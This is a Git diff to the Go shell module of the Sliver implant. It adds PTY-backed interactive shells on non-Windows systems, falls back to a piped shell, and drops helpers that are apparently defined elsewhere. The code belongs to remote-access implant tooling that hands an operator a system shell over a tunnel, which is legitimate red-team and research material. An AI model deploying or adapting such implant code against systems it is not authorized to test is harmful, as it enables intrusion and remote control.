@@ -1,4 +1,4 @@
-//go:build !(linux || darwin || windows)
+//go:build !windows
 
 package shell
 
@@ -21,12 +21,14 @@ package shell
 */
 
 import (
-	"io"
+
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
-	"os"
+
 	"os/exec"
+
+	"github.com/bishopfox/sliver/implant/sliver/shell/pty"
 )
 
 var (
@@ -34,14 +36,6 @@ var (
 	bash = []string{"/bin/bash"}
 	sh   = []string{"/bin/sh"}
 )
-
-// Shell - Struct to hold shell related data
-type Shell struct {
-	ID      uint64
-	Command *exec.Cmd
-	Stdout  io.ReadCloser
-	Stdin   io.WriteCloser
-}
 
 // Start - Start a process
 func Start(command string) error {
@@ -51,6 +45,9 @@ func Start(command string) error {
 
 // StartInteractive - Start a shell
 func StartInteractive(tunnelID uint64, command []string, enablePty bool) *Shell {
+	if enablePty {
+		return ptyShell(tunnelID, command)
+	}
 	return pipedShell(tunnelID, command)
 }
 
@@ -59,9 +56,7 @@ func pipedShell(tunnelID uint64, command []string) *Shell {
 	log.Printf("[shell] %s", command)
 	// {{end}}
 
-	var cmd *exec.Cmd
-	cmd = exec.Command(command[0], command[1:]...)
-
+	cmd := exec.Command(command[0], command[1:]...)
 	stdin, err := cmd.StdinPipe()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -85,6 +80,29 @@ func pipedShell(tunnelID uint64, command []string) *Shell {
 	}
 }
 
+func ptyShell(tunnelID uint64, command []string) *Shell {
+	// {{if .Config.Debug}}
+	log.Printf("[ptmx] %s", command)
+	// {{end}}
+
+	cmd := exec.Command(command[0], command[1:]...)
+	term, err := pty.Start(cmd)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[term] %v, falling back to piped shell...", err)
+		// {{end}}
+		return pipedShell(tunnelID, command)
+	}
+	cmd.Start()
+
+	return &Shell{
+		ID:      tunnelID,
+		Command: cmd,
+		Stdout:  term,
+		Stdin:   term,
+	}
+}
+
 // GetSystemShellPath - Find bash or sh
 func GetSystemShellPath(path string) []string {
 	if exists(path) {
@@ -94,21 +112,4 @@ func GetSystemShellPath(path string) []string {
 		return bash
 	}
 	return sh
-}
-
-// StartAndWait starts a system shell then waits for it to complete
-func (s *Shell) StartAndWait() {
-	s.Command.Start()
-	s.Command.Wait()
-}
-
-func exists(path string) bool {
-	_, err := os.Stat(path)
-	if err == nil {
-		return true
-	}
-	if os.IsNotExist(err) {
-		return false
-	}
-	return true
 }
